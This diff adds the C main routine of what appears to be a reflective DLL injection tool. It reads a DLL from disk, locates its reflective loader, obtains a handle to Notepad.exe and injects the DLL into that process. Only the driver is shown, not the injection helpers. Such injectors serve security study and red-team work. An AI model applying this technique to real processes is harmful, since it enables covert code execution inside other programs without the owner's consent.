@@ -1,0 +1,61 @@
+#include "NativeInjector.h"
+
+int main(int argc, char* argv[])
+{
+
+	HANDLE	hProcess = NULL;
+
+	DWORD	PID = 0,
+		ReflectiveDllOffset = 0,
+		ReflectiveDllSize = 0;
+
+	PWCHAR	ReflectiveDllName = L".\\ReflectiveLoader.dll",
+		TargetProcessName = L"Notepad.exe";
+
+	LPVOID	ReflectiveDllBuffer = NULL;
+
+	INFO("Reading Dll...");
+
+	if (!ReadTargetFileW(ReflectiveDllName, &ReflectiveDllBuffer, &ReflectiveDllSize))
+	{
+		PRINT_ERROR("ReadTargetFile");
+		return 1;
+	}
+
+
+	INFO("Calculating File Offset...");
+
+	if (!(ReflectiveDllOffset = GetReflectiveLdrOffset((UINT_PTR)ReflectiveDllBuffer)))
+	{
+		PRINT_ERROR("GetReflectiveLdrOffset");
+		return 1;
+	}
+
+	OKAY("[0x%0.8X] Reflective Loader Offset Found!", ReflectiveDllOffset);
+
+	INFO("Getting Target Process PID...");
+
+	if (!GetRemoteId(TargetProcessName, &PID, &hProcess))
+	{
+		PRINT_ERROR("GetRemoteId");
+		return 1;
+	}
+
+	OKAY("[%ld] Current Pid For %ls", PID, TargetProcessName);
+
+	INFO("Injecting...");
+
+	if (!InjectReflectiveDll(hProcess, ReflectiveDllOffset, (PBYTE)ReflectiveDllBuffer, ReflectiveDllSize))
+	{
+		PRINT_ERROR("InjectReflectiveDll");
+		return 1;
+	}
+
+	OKAY("Success!");
+
+	CHAR("Quit...");
+	getchar();
+
+	return 0;
+
+}
